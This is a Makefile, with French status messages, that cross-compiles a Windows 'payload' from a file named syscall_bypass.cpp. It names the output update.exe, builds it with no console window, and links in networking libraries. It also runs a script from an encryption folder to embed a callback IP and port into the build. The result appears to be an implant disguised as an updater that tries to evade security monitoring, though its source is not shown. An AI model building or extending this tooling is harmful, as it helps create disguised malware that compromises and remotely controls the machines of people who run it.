IP ?= 192.168.101.1
PORT ?= 80

CXX = x86_64-w64-mingw32-g++
CXXFLAGS = -I. 
LDFLAGS = -lwininet -lole32 -luuid -static -static-libgcc -static-libstdc++ -mwindows

TARGET = update.exe
SRC = syscall_bypass.cpp
CONFIG = config.h

all: $(TARGET)

$(CONFIG):
	@echo "[*] Generation de la configuration pour $(IP):$(PORT)..."
	python3 ../encryption/gen_config.py $(IP) $(PORT) > $(CONFIG)

$(TARGET): $(CONFIG) $(SRC)
	@echo "[*] Compilation du Payload..."
	$(CXX) $(SRC) -o $(TARGET) $(CXXFLAGS) $(LDFLAGS)
	@echo "[+] SUCCES : $(TARGET) cree."

clean:
	rm -f $(TARGET) $(CONFIG)